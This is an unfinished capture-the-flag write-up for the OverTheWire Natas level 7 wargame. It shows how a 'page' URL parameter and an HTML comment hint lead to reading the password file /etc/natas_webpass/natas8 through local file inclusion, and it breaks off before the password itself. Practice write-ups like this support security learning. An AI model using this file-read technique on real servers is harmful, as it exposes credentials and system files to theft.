In this level we can click on a "home" and "about" pages, nothing inteesting there, but if we take a look at the parameters
on the url, we can see how it behavies: 

	->http://natas7.natas.labs.overthewire.org/index.php?page=home
	->http://natas7.natas.labs.overthewire.org/index.php?page=about 

We look at the souce code of the page and we find:
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

So it's clear it wants us to do something like this:
	
	http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

And we get the password:
